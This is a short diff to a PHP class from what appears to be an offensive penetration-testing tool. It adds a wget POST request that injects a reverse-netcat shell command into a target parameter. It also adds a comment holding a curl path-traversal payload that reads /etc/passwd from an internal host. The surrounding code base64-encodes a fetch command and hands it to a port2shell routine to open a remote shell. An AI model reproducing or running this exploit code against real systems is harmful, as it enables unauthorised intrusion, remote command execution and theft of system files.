@@ -110,7 +110,8 @@ class PARAM4COM extends URL{
                 $url = $this->param2url($template, $cmd_rev_nc);
                 
                 if ($this->methode_http=="GET") $data = "wget --user-agent=\"$user_agent\" --timeout=30 --tries=2 --no-check-certificate \"$url\" -qO-  ";
-               // if ($this->methode_http=="POST") $data = "wget --user-agent=\"$user_agent\" --timeout=30 --tries=2 --no-check-certificate \"$this->uri_path\" --data \"\" -qO-  ";
+                if ($this->methode_http=="POST") $data = "wget --user-agent=\"$user_agent\" --timeout=30 --tries=2 --no-check-certificate \"$this->uri_path\" --data \"$this->param=$cmd_rev_nc\" -qO-  ";
+                // curl -s --data-urlencode urlConfig=../../../../../../../../../etc/passwd http://10.60.10.161/administrator/alerts/alertConfigField.php
                 $template_rec = "wget --user-agent='$user_agent' --timeout=30 --tries=2 --no-check-certificate \"$template\" -qO-  ";               
                
                 $this->port2shell(base64_encode($template_rec));
